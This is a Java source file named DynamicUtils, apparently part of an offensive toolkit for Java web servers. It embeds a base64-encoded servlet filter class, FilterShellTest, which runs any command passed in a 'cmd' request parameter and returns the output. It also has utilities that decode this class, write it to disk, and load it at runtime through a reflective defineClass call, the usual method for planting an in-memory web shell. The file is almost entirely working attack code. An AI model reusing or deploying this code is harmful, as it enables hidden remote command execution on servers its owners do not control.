package cc.saferoad.servlet;/*
@auther S0cke3t
@date 2021-12-27
*/


import sun.misc.BASE64Decoder;

import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;

public class DynamicUtils {
    public static String FILTER_CLASS_STRING = "yv66vgAAADQAeQoAEgBDCABECwBFAEYKAAoARwsASABJCgBKAEsKAEoATAoATQBOCgBPAFAHAFEK\n" +
            "AAoAUgoAUwBUCgBPAFUKAFMAVgoAUwBVCwBXAFgHAFkHAFoHAFsBAAY8aW5pdD4BAAMoKVYBAARD\n" +
            "b2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIkxjYy9z\n" +
            "YWZlcm9hZC9UZXN0L0ZpbHRlclNoZWxsVGVzdDsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0Zp\n" +
            "bHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZp\n" +
            "ZzsBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2Vy\n" +
            "dmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAANvdXQB\n" +
            "ABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEA\n" +
            "AmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABYQEAAUkBAAFiAQACW0IBAA5zZXJ2bGV0UmVx\n" +
            "dWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEA\n" +
            "H0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9z\n" +
            "ZXJ2bGV0L0ZpbHRlckNoYWluOwEAB2NvbW1hbmQBABJMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFj\n" +
            "a01hcFRhYmxlBwBZBwBcBwBdBwBeBwBRBwBfBwBgBwBhBwAqAQAKRXhjZXB0aW9ucwcAYgcAYwEA\n" +
            "B2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAURmlsdGVyU2hlbGxUZXN0LmphdmEMABQAFQEAA2NtZAcA\n" +
            "XAwAZABlDABmAGcHAF0MAGgAaQcAagwAawBsDABtAG4HAGAMAG8AcAcAYQwAcQByAQAQamF2YS9s\n" +
            "YW5nL1N0cmluZwwAFABzBwBfDAB0AHUMAHYAFQwAdwAVBwBeDAAfAHgBACBjYy9zYWZlcm9hZC9U\n" +
            "ZXN0L0ZpbHRlclNoZWxsVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0Zp\n" +
            "bHRlcgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZs\n" +
            "ZXRSZXNwb25zZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BABNqYXZhL2lvL1ByaW50V3Jp\n" +
            "dGVyAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9J\n" +
            "T0V4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEADGdldFBhcmFtZXRl\n" +
            "cgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAHaXNFbXB0eQEAAygp\n" +
            "WgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQARamF2YS9sYW5nL1J1bnRp\n" +
            "bWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9s\n" +
            "YW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2\n" +
            "YS9pby9JbnB1dFN0cmVhbTsBAARyZWFkAQAFKFtCKUkBAAcoW0JJSSlWAQAHcHJpbnRsbgEAFShM\n" +
            "amF2YS9sYW5nL1N0cmluZzspVgEABWNsb3NlAQAFZmx1c2gBAEAoTGphdmF4L3NlcnZsZXQvU2Vy\n" +
            "dmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWACEAEQASAAEAEwAA\n" +
            "AAQAAQAUABUAAQAWAAAAMwABAAEAAAAFKrcAAbEAAAACABcAAAAKAAIAAAAPAAQAEAAYAAAADAAB\n" +
            "AAAABQAZABoAAAABABsAHAABABYAAAA1AAAAAgAAAAGxAAAAAgAXAAAABgABAAAAFAAYAAAAFgAC\n" +
            "AAAAAQAZABoAAAAAAAEAHQAeAAEAAQAfACAAAgAWAAABbgAGAAoAAAB0KxICuQADAgA6BBkExgBf\n" +
            "GQS2AASaAFcsuQAFAQA6BbgABhkEtgAHOgYZBrYACDoHAzYIEQQAvAg6CRkHGQm2AAlZNggCnwAX\n" +
            "GQW7AApZGQkDFQi3AAu2AAyn/+EZB7YADRkFtgAOGQW2AA8tKyy5ABADALEAAAADABcAAAA6AA4A\n" +
            "AAAYAAoAGQAXABoAHwAbACkAHAAwAB0AMwAeADoAHwBIACAAXAAiAGEAIwBmACQAawAmAHMAJwAY\n" +
            "AAAAZgAKAB8ATAAhACIABQApAEIAIwAkAAYAMAA7ACUAJgAHADMAOAAnACgACAA6ADEAKQAqAAkA\n" +
            "AAB0ABkAGgAAAAAAdAArACwAAQAAAHQALQAuAAIAAAB0AC8AMAADAAoAagAxADIABAAzAAAAPAAD\n" +
            "/wA6AAoHADQHADUHADYHADcHADgHADkHADoHADsBBwA8AAAh/wAOAAUHADQHADUHADYHADcHADgA\n" +
            "AAA9AAAABgACAD4APwABAEAAFQABABYAAAArAAAAAQAAAAGxAAAAAgAXAAAABgABAAAALAAYAAAA\n" +
            "DAABAAAAAQAZABoAAAABAEEAAAACAEI=";

    public static InputStream base64ToInputStream(String base64) {
        ByteArrayInputStream stream = null;
        try {
            byte[] bytes = Base64.getDecoder().decode(base64);
            stream = new ByteArrayInputStream(bytes);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return stream;
    }

    public static void getFile(InputStream is, String fileName) throws IOException {
        BufferedInputStream in = null;
        BufferedOutputStream out = null;
        in = new BufferedInputStream(is);
        out = new BufferedOutputStream(new FileOutputStream(fileName));
        int len = -1;
        byte[] b = new byte[1024];
        while ((len = in.read(b)) != -1) {
            out.write(b, 0, len);
        }
        in.close();
        out.close();
    }

    public static Class<?> getClass(String classCode) throws IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, InstantiationException {
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        BASE64Decoder base64Decoder = new BASE64Decoder();
        byte[] bytes = base64Decoder.decodeBuffer(classCode);

        Method method = null;
        Class<?> clz = loader.getClass();
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }

        if (method != null) {
            method.setAccessible(true);
            return (Class<?>) method.invoke(loader, bytes, 0, bytes.length);
        }

        return null;

    }

    public static void main(String[] args) throws Exception {

        getFile(base64ToInputStream(FILTER_CLASS_STRING), "filter.class");
    }
}
